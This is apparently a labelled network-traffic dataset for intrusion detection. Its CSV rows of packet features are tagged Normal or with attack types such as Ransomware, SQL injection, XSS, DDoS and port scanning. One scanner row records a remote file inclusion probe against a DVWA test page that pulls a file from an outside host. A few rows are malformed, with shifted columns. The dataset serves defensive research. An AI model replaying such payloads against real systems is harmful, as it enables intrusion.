frame.time,ip.src_host,ip.dst_host,arp.dst.proto_ipv4,arp.opcode,arp.hw.size,arp.src.proto_ipv4,icmp.checksum,icmp.seq_le,icmp.transmit_timestamp,icmp.unused,http.file_data,http.content_length,http.request.uri.query,http.request.method,http.referer,http.request.full_uri,http.request.version,http.response,http.tls_port,tcp.ack,tcp.ack_raw,tcp.checksum,tcp.connection.fin,tcp.connection.rst,tcp.connection.syn,tcp.connection.synack,tcp.dstport,tcp.flags,tcp.flags.ack,tcp.len,tcp.options,tcp.payload,tcp.seq,tcp.srcport,udp.port,udp.stream,udp.time_delta,dns.qry.name,dns.qry.name.len,dns.qry.qu,dns.qry.type,dns.retransmission,dns.retransmit_request,dns.retransmit_request_in,mqtt.conack.flags,mqtt.conflag.cleansess,mqtt.conflags,mqtt.hdrflags,mqtt.len,mqtt.msg_decoded_as,mqtt.msg,mqtt.msgtype,mqtt.proto_len,mqtt.protoname,mqtt.topic,mqtt.topic_len,mqtt.ver,mbtcp.len,mbtcp.trans_id,mbtcp.unit_id,Attack_label,Attack_type
 2021 20:19:00.983683000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,221793.0,2692277050.0,6053.0,0.0,0.0,0.0,0.0,60210.0,16.0,1.0,0.0,0101080a3dd9c1492b6fb096,0,1.0,4321.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Backdoor
 2021 12:13:44.593192000 ,192.168.0.101,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,46388.0,0.0,0.0,1.0,0.0,1883.0,2.0,0.0,0.0,020405b40103030801010402,0,0.0,50379.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0,0,0.0,0.0,0.0,0.0,0.0,0,Normal
 2021 21:43:42.185606000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0.0,0,0,0.0,0.0,0.0,0.0,2108.0,0.0,1.0,0.0,0.0,80.0,4.0,0.0,0.0,0,0,327.0,45736.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,SQL_injection
 2021 23:41:59.968636000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2013966124.0,48703.0,0.0,0.0,0.0,0.0,4321.0,24.0,1.0,464.0,0101080ac5dcad968eb9c1b9,2a18c3271c80f918881683da88fd37f5b97308cf2a18c3262a18c29f2a18c327a094e7d75de8584a823077061aa6180896f9b4c408760c7e956ac8194e981078de9354396dec1dcc2a1747fe2ff6c21c5f3952212df502682809730495a8a34116bcf9804757fa5d1b256119aeedc05eefc9e259c0a7e3825365eb58e6eddb891da8b36ea8e0ce2cf4fb72d4bd8b037c55b747a423d12cc9b252b3c688e047883138949b7d868ce809e5bc1c260ca023d8b954cf67449cd40a1951faaa4bb1ec8b84e73d0b65dec311ead64450b3b7e521112a6f10f01af2006981afd2baaf95bfc40b92ebd9614ac8a3e49720e28fa41b1848c2fb15019983dbf76d92bf8de736b81d012096cdb1738d665698be4970bd80af3467f7d7f0c09db611804638d0d2fd4d0bc64879d4f50966ec131176773bc69c77ae309d88be79896ec025bdadb7476a1c9eb3924689cf02f6bfb1dd7c63612a642917d5d1cb00a62d5617d9240485f00e144ec31b8e655b83ece2f495af4ee02c5e43e6a7d5fe2195bb7772419704b2412a69a9389f02bb6d866e71f29e6a9c379dc6e17eb72699149c5c0a036bf0d4a1d456030f4a23f83733bb5762d3a83a5903520b4f3d5955755aa2818c45c56b1ebfcba6633fc3883ba78581f8,735953.0,47924.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Ransomware
 2021 23:11:40.730101000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0.0,0,0,0.0,0.0,1.0,1833901863.0,50090.0,0.0,0.0,0.0,1.0,59818.0,18.0,1.0,0.0,020405b40402080a4a073299408607db01030307,0,0.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Uploading
 2021 23:30:16.158510000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2013966124.0,31266.0,0.0,0.0,0.0,0.0,4321.0,24.0,1.0,464.0,0101080ac5d1f0548eaf047f,817ab21fb7e288202374f2e2239f46cd121179f7817ab21e817ab3a7817ab21fd89c3ae09df80d0df21e9ae41cefa86719e18c7d5051ce64166729fd06ba8f1e4caf214e2fec3b51061d4a79b2fd6a230479e9e67b40d20993340ec02c2dd80e148ae613332dded92d68ecff54fbaa4dad474a44cd19ab4918008213edcfff6e945478c3719352887e5c088de71717e52e7ec730c6ef89b6ee3630b5b7c0675f0b0c2556c244ce1fc50483e7be8d31e4eb8198c19e6893712b4da434bc828b1268bd65f2ea2224280916ba038d7ce6fb6edb68a68d560ce6c2be18cc5b9b2aac2941edff18d331d4cfbc34c85a336b4418e9a1f025aa2cae2e36723a28d61e68d49d568b57f8164134e21393760b2e9009e98d7bb25795621c7d77b0124d65daa38ddf20c1802e3a121f8ae8dcb36afab19fea34315f52a9321befb023d929e68b3dcd5fafaadae1da29f26eb883b48dd7da661f88d70c8e22c90b8bfbc02575c973299b2c7e852a3b94e208822c64e60f05fb499f530ad1404f031c08df996492ab4e3abaca709fd9f4abe713317c0e5b01891b5bf271ad9da5faa960c968d1257f7eb26cac9c07e5e276a980a9a72b825bfc635acac6ede9705be052ee01798c31c545f2c141eab8c805cfc2c25b8f,574401.0,47924.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Ransomware
 2021 21:42:27.982010000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0.0,0,0,0.0,0.0,367.0,905821405.0,6614.0,0.0,0.0,0.0,0.0,80.0,16.0,1.0,0.0,0101080a9b24f4749eb28766,0,334.0,44358.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,SQL_injection
 2021 23:24:05.022149000 ,183.146.233.70,192.168.0.128,0,0.0,0.0,0,22620.0,40024.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_ICMP
 2021 16:20:14.640574000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,520272757.0,18743.0,0.0,1.0,0.0,0.0,2391.0,20.0,1.0,0.0,0.0,0.0,1.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Port_Scanning
 2021 23:04:37.374543000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,451505835.0,55013.0,0.0,1.0,0.0,0.0,48122.0,20.0,1.0,0.0,0,0,1.0,4321.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Ransomware
 2021 18:37:47.771069000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0,0.0,0.0,0,0,0,0,0.0,0.0,441.0,4197285095.0,24371.0,0.0,0.0,0.0,0.0,80.0,16.0,1.0,0.0,0101080a9a7be2a59e09755a,0,103.0,59878.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,XSS
 2021 21:36:02.670390000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0.0,0,0,0.0,0.0,1.0,2454549802.0,47520.0,0.0,0.0,0.0,1.0,38182.0,18.0,1.0,0.0,020405b40402080a9eaca6589b1f139a01030307,0,0.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,SQL_injection
 2021 18:09:47.272354000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0,0.0,0.0,0,0,0,0,0.0,0.0,486.0,326842534.0,7551.0,0.0,0.0,0.0,0.0,80.0,16.0,1.0,0.0,0101080a9a623e219defd0e8,0,122.0,59420.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,XSS
 2021 11:36:52.980267000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0,0.0,0.0,0,0.0,0,0,0.0,0.0,835.0,2642141913.0,55189.0,0.0,0.0,0.0,0.0,58956.0,16.0,1.0,0.0,0101080a1dd625410aa5c47f,0,1.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_HTTP
168.134.214.0,192.168.0.128,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,52233.0,0.0,1113863.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_UDP
 2021 17:58:36.487081000 ,192.168.0.128,192.168.0.101,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2734595660.0,62666.0,0.0,0.0,0.0,1.0,56220.0,18.0,1.0,0.0,020405b40101040201030307,0,0.0,1883.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0,0,0.0,0.0,0.0,0.0,0.0,0,Normal
 2021 18:06:13.933960000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0,0.0,0.0,0,0,0,0,0.0,0.0,104.0,293815026.0,6927.0,0.0,0.0,0.0,0.0,59372.0,16.0,1.0,0.0,0101080a9dec8f979a5efcd4,0,442.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,XSS
 2021 11:38:39.083307000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0,0.0,0.0,0,0.0,0,0,0.0,0.0,1.0,2962012929.0,11285.0,0.0,0.0,0.0,0.0,80.0,16.0,1.0,0.0,0101080a0aa763321dd7c391,0,1.0,46754.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_HTTP
 2021 16:29:15.422319000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1013594299.0,402.0,0.0,0.0,0.0,0.0,4321.0,24.0,1.0,464.0,0101080ade45fcd40685a7fd,bfc0e5fb0f2506d2e7eba1c60c3be56ef426d7b5bfc0e5fabfc0e443bfc0e5fb62da50e95c4d9d53b393f7ea6bc1ba770d7d1e6d8dcd0a8df2f4b9fd4d5319384485932c7cf3d8276e8d07dad0716f16587ac7564185bf3fd9a2fc6bb402ab913224e71cab9fe969f4e2b5a2c1e9ee0a70c247dd1493ad61c20487a7ee4ecc94117ea82b93f299c784ec67177e955f2a85015cdc512d67455b8f1e46bc0413ad341ced5afc79bc75a6bc81db619915646a0597cd3f1505d9c2131904f6910e49b3205c758b1c1b495d88ef04e133a80a1e7eb3764d27f34412d0567827ba057d48aedd3cf273038348ca6e3b37f022d541b3b79f93d2db1bfeae14b0999bb16d150b398461ebc1248d6071641b0cc22a4d207812df23d641ac2cd3dce095b601af8d9b98cf7ace35734e433f9479997c8f046be5b25155ff4029807c05a22b269ae6d67b6c4cc8efbb6ab7bd4bceac4433e065dadf36a932b6f4faf2de4f00bc8f878bf2afcbb3f6558b1aaa73853f57aa9c1a91cc4381c75471962d88f193495270fec90ef35f78eaa276857ef76dce72e3e11a47353e75a8c7377b90399ffbbba37c4a1c93f43d0dda5842339b1da150d0da74d07fdf2fab1b00671a787af4294f61f11adf6e0b1d7ca1e64a5f850d,374353.0,35306.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Ransomware
 2021 18:13:40.885575000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1453306566.0,11631.0,0.0,0.0,0.0,0.0,4321.0,24.0,1.0,400.0,0101080a2afcf1463d66feef,1162f4f5dba4bcf9a5bbbeb391387735086ce9811162f4f41162f58d1162f4f51adc8c69aa2b0515141d84451216f634963dbb7651456ace69d205a2df5dfc33b2450b3bbe994cd14895ef73ba6a7b953c58cb322a094f0b4a6a07fbeffddccc26e9fcbbc6439c3c35701a089c9f8bc944a275e8245d3eea91693fa2e681b19b313fb48c63123a9b0a721cf8ac78110c791bceaa7b672ac8cc67ffc701fb67276d1df05c70115f6c61dd563770899c0b6d7259b85df1937b68504eb3f953adc31dad9f466dc3ef28810925ac0b59753b05f8bca71eaafec94172e6cc3fb914398e1d6cc1c8eadb3b2f7e92853f8f8b0811d4b2a8d657cd63e4395e33807ed8978f73f92d3fd956197c4479e922831cbc34bac6a43f6baa5d9bd43526154cd7d943b2e51dc7b522aa4ba5ad8c0010be6785e160d4967d3d6c661472ea461a5025cf62ff6301480f4691051b41268323c4a2d895a703e6a0cac7b94a94ef2976469f8401efc4990b66a116669b6bfb664eb249a286e564b8756926f13e0dda31e58a6f25528f690d74786302609ed7ac8f,783185.0,56322.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Backdoor
 2021 19:40:01.970381000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,method=open+service%3a3%2e0%2e2%2e1105&service%5fname=%2f,57.0,cutepath=http://cirt.net/rfiinc.txt??,GET,0,http://192.168.0.128/DVWA/inc/shows.inc.php?cutepath=http://cirt.net/rfiinc.txt??,HTTP/1.1,0.0,0.0,21287.0,1099046739.0,34181.0,0.0,0.0,0.0,0.0,80.0,24.0,1.0,319.0,0101080a3fc4446b494570ca,474554202f445657412f696e632f73686f77732e696e632e7068703f63757465706174683d687474703a2f2f636972742e6e65742f726669696e632e7478743f3f20485454502f312e310d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d4c656e6774683a2035370d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a557365722d4167656e743a204d6f7a696c6c612f352e303020284e696b746f2f322e312e3629202845766173696f6e733a4e6f6e65292028546573743a303034383830290d0a486f73743a203139322e3136382e302e3132380d0a0d0a6d6574686f643d6f70656e2b736572766963652533613325326530253265322532653131303526736572766963652535666e616d653d253266,13975.0,50752.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Vulnerability_scanner
 2021 17:46:38.604127000 ,192.168.0.128,192.168.0.101,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,59.0,3287853613.0,51965.0,0.0,0.0,0.0,0.0,57534.0,16.0,1.0,0.0,0,0,6.0,1883.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0,0,0.0,0.0,0.0,0.0,0.0,0,Normal
 2021 23:19:04.534535000 ,213.108.86.158,192.168.0.128,0,0.0,0.0,0,1044.0,58540.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_ICMP
 2021 23:23:39.037590000 ,49.223.171.141,192.168.0.128,0,0.0,0.0,0,62133.0,17086.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_ICMP
 2021 23:12:03.756197000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0.0,0,0,0.0,0.0,1.0,1815498872.0,39203.0,0.0,1.0,0.0,0.0,51838.0,20.0,1.0,0.0,0,0,1.0,3333.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Uploading
 2021 23:24:28.089133000 ,148.236.11.153,192.168.0.128,0,0.0,0.0,0,52580.0,37859.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_ICMP
 2021 16:18:50.553490000 ,192.168.0.101,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2497595452.0,41779.0,0.0,0.0,0.0,0.0,1883.0,24.0,1.0,14.0,0,100c00044d5154540402003c0000,1.0,49819.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0,1.0,2.0,16.0,12.0,0.0,0,1.0,4.0,MQTT,0,0.0,4.0,0.0,0.0,0.0,0,Normal
 2021 13:28:53.946375000 ,192.168.0.101,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,1623223191.0,27393.0,0.0,0.0,0.0,0.0,1883.0,16.0,1.0,0.0,0,0,59.0,55121.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0,0,0.0,0.0,0.0,0.0,0.0,0,Normal
 2021 23:12:18.426869000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0.0,0,0,0.0,0.0,1.0,1367803895.0,63517.0,0.0,1.0,0.0,0.0,52916.0,20.0,1.0,0.0,0,0,1.0,3333.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Uploading
 2021 23:19:14.197574000 ,127.24.171.253,192.168.0.128,0,0.0,0.0,0,46983.0,28921.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_ICMP
104.105.235.87,192.168.0.128,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23098.0,0.0,671750.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_UDP
 2021 18:20:15.898124000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0,0.0,0.0,GET,0,http://192.168.0.128/dvwa/vulnerabilities/,HTTP/1.1,0.0,0.0,1.0,1183168403.0,29721.0,0.0,0.0,0.0,0.0,80.0,24.0,1.0,102.0,0101080a9a6bd5b89df9687f,474554202f647677612f76756c6e65726162696c69746965732f20485454502f312e310d0a486f73743a203139322e3136382e302e3132380d0a557365722d4167656e743a202d2d726576657273652d636865636b0d0a4163636570743a202a2f2a0d0a0d0a,1.0,59590.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,XSS
 2021 20:19:19.584545000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2213215181.0,63624.0,0.0,0.0,0.0,0.0,4321.0,24.0,1.0,304.0,0101080a2b6ff9513dda07f9,0542a0aa4a8a6afbbf46e55484c2598d61c6d3f60542a0ab0542a1b20542a0aa71ccbc52e70c1202ed589b08e1f3e6dc9423cf7e33f28f3092da99cea13930a7cb98345aa05dea1e11bebf8c85d8960eb913b68b6d6033d3346a59b1022a5374bfd04701970f4c21905036f57e83f5e4d211c945ed5bad0633cb4ab97af884815d6533d8135f982f86785db5994bb5e653013326274eef8bd864c217c5556c74614b0e37646ddbc8b13175d0e2f0cbd7a9949d68fe8be24fa03ebaf67c809bc5ba87c4a0f1917d42c9c2f7d732205c61c75de7240b7319bbe92115c93bf35f11fc5d8678654d7d38d9a8e1215e93c562f5ce0c48150275a8ba1b6329784c5560b8240fdbfb6c66279d410c837556100fac492dc3f7c43a70c231ff397f56a67faa7ddc218ccc7182c6cf99a8dbe5fa91,236289.0,60210.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Backdoor
 2021 23:23:39.711206000 ,93.52.40.48,192.168.0.128,0,0.0,0.0,0,54179.0,21725.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_ICMP
 2021 18:05:55.989674000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1063834400.0,1063834400.0,28665.0,0.0,0.0,1.0,0.0,80.0,2.0,0.0,0.0,0.0,0.0,0.0,8725.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Port_Scanning
 2021 23:18:43.269976000 ,172.120.51.14,192.168.0.128,0,0.0,0.0,0,39433.0,61206.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_ICMP
54.158.2.231,192.168.0.128,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,45852.0,0.0,2254508.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_UDP
